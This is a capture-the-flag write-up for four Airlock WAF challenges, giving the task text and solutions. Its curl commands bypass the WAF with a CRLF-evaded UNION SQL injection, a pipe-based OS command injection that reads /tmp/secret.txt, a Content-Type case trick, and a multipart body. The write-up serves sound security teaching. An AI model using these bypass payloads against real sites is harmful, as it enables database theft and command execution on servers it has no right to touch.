# Airlock WAF (easy - 50 Points)

## Task

This challenge is sponsored by Ergon, the vendor of Airlock Secure Access hub.

This challenge consists of 4 vulnerable web sites. The sites are accessible by the URLs:

- Challenge 1: /challenge1/start.php
- Challenge 2: /challenge2/<UUID2>.php
- Challenge 3: /challenge3/<UUID3>.php
- Challenge 4: /challenge4/<UUID4>.php

By solving challenge1 you will get UUID2, by solving challenge2 you will get UUID3 and so on.

Submit the flag to prove that you solved all 4 challenges. The flag is the UUID you discover in the last challenge (challenge 4).

All 4 web sites have a well-documented web security vulnerability. The Web Application Firewall Airlock Gateway is deployed in front of the web server to prevent exploitation of the vulnerabilities. For all challenges there is an explicit bug implemented into the WAF configuration.

If you need a hint, please ask Reto. Send him an e-mail to reto.ischi@airlock.com.


### Challenge 1/4: Currency Converter

The application uses a MySQL database to store the conversion rates and calculate the result. The currency field is vulnerable to a SQL injection attack.

Vulnerable SQL statement:
```
$sql = "SELECT ROUND(? * value, 2) AS res FROM currencies WHERE name = '$convert_to'";
```
A table secrets contains the UUID to the next challenge /challenge2/<UUID>.php

Assume the attacker can use an UNION SQL injection attack to read the values from the secrets table.

Exploit:
```
challenge1/start.php?amount=50&currency=%27+union+select+*+from+secrets+%23
```

Unfortunately for the hacker, Airlock WAF blocks the parameter currency because it looks like SQL injection. Can you modify the parameter to bypass the WAF?

Hint: Whitespace character

We introduced a bug into the SQL rules of Airlock WAF for this challenge. Note that a good WAF should block any hacker evasion technique.

### Challenge 2/4: User Disk Quota Checker

The page displays the used disk quota for a specific user. The user can be specified with the parameter user. Example:
```
/challenge2/<UUID>.php?user=thomas
```

The parameter is vulnerable to an OS command injection vulnerability. The application uses the following bash command to calculate the disk usage:
```
du -sh '/home/$user' | cut -f1
du -sh '/home/$user' | cut -f1
```

Read out the UUID for the next challenge from the file /tmp/secret.txt using the OS command injection vulnerability to be able to access the next challenge. An example exploit would be:

```
/challenge2/<UUID>.php?user=sdkfj%27%20%3B%20cat%20%2Ftmp%2Fsecret.txt%20%23%27
/challenge2/<UUID>.php?user=sdkfj%27%20%3B%20cat%20%2Ftmp%2Fsecret.txt%20%23%27
```
Again, the WAF blocks this attack. Can you modify the exploit string to bypass the WAF?
Hint: Operator

### Challenge 3/4: Account Transfer 1/2

Can you transfer money to the target account 99-999999-999 to solve this challenge?

The WAF administrator restricted the parameter values of account_to.

Hint 1: A good WAF must be able to recognize the format of a web request in the same way as the back-end application. If this is not possible the request must be normalized or blocked. Otherwise an attacker can bypass all filter rules.

How does a web server detect that the request is encoded as HTML form data? Try to modify the format indicator so that the back-end application recognizes the request body as HTML form data but the WAF does not.

Hint 2: tamper suffix

### Challenge 4/4: Account Transfer 2/2

Again, send money to 99-999999-999 to solve the last challenge step.

A good WAF must be able to understand/parse all common web formats like HTML form data or JSON to detect attack payloads in data fields. WAF filter rules are useless if corresponding parsers are not available or enabled.

Hint: multipart

## Solution

### Challenge 1

Using a \n\r (%0A%0D urlencoded) to bypass the check:
```
$ curl "https://1ea162d4-e49d-4390-a182-aa40070e6e96.idocker.vuln.land/challenge1/start.php?amount=2&currency=%27+%0A%0Dunion+select+*+from+secrets+%23"
[...]
Result: 12076336-a10a-11eb-bcbc-0242ac130002</p>
```

### Challenge 2

Use a Pipe symbol instead of the Semicolon:
```
$ curl "https://e8d14112-dc08-4e87-9f8c-f573764d91d8.idocker.vuln.land/challenge2/12076336-a10a-11eb-bcbc-0242ac130002.php?user=sdkfj%27%20%7C%20cat%20%2Ftmp%2Fsecret.txt%20%23%27"
[...]
User sdkfj' | cat /tmp/secret.txt #' used '21d3038f-a90a-49bc-b2f4-f300adef741e
' of his 1GB disk quota.
```


### Challenge 3

Use uppercase "X" in the content type header:
```
$ curl 'https://5b6bfd70-6040-4613-8895-c16a06c327c8.idocker.vuln.land/challenge3/21d3038f-a90a-49bc-b2f4-f300adef741e.php' -H 'Content-Type: application/X-www-form-urlencoded' --data-raw 'amount=3&account_from=11-111111-111&account_to=99-999999-999'
[...]
3 USD transferred from 11-111111-111 to 99-999999-999<p><b><font color="red">You made it. Flag: fa2f20aa-1e5a-4a21-ba75-ff31758eee55</font><b>
```

### Challenge 4

Use Multipart Request instead of normal form data:
```
$ curl 'https://5b6bfd70-6040-4613-8895-c16a06c327c8.idocker.vuln.land/challenge4/fa2f20aa-1e5a-4a21-ba75-ff31758eee55.php' -F amount=1 -F account_from=11-111111-111 -F account_to=99-999999-999
[...]
1 USD transferred from 11-111111-111 to 99-999999-999<p><b><font color="red">You made it. Flag: b8cc53a0-19ed-4d5c-aa7e-8b3e135559fa</font><img src="./rock.jpg"><b>

```
